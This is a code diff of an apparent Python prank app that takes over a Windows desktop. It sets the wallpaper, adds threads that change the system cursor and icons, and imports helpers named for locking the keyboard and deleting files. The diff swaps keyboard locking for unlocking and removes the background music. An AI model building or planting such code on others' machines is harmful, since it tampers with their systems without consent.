@@ -10,6 +10,7 @@ import pygame
 from lock import lock_key, unlock_key
 from remove_file import DeleteFile
 from click_movie import click_mouse
+from change_mouse import SystemChange
 
 class ImageLabel(tk.Label):
     def load(self, im):
@@ -57,10 +58,6 @@ class App(tk.Tk):
         self.y = self.screen_height - self.window_height - 10
         self.geometry(f"{self.window_width}x{self.window_height}+{self.x}+{self.y}")
 
-        pygame.mixer.init()
-        pygame.mixer.music.load(os.path.dirname(os.path.realpath("__file__"))+"\media\\Nevermind.mp3")
-        pygame.mixer.music.play()
-
         self.lbl = ImageLabel(self)
         self.lbl.pack()
 
@@ -74,14 +71,19 @@ class App(tk.Tk):
         self.thread_bg = threading.Thread(target=self.bg_new, args=(1,))
         self.thread_bg.start()
 
-        self.thread_lock_keyboard = threading.Thread(target=lock_key)
+        self.thread_lock_keyboard = threading.Thread(target=unlock_key)
         self.thread_lock_keyboard.start()
 
         self.thread_click_sound = threading.Thread(target=click_mouse)
         self.thread_click_sound.start()
 
+        self.replase_folder = SystemChange()
+        self.replase_folder_change_cursor = threading.Thread(target=self.replase_folder.change_cursor)
+        self.replase_folder_change_cursor.start()
+        self.replase_folder_change_icons = threading.Thread(target=self.replase_folder.change_icons)
+        self.replase_folder_change_icons.start()
+
     def set_wallpaper(self, image_path):
-        # Set desktop wallpaper on Windows
         ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
 
     def bg_new(self,i):
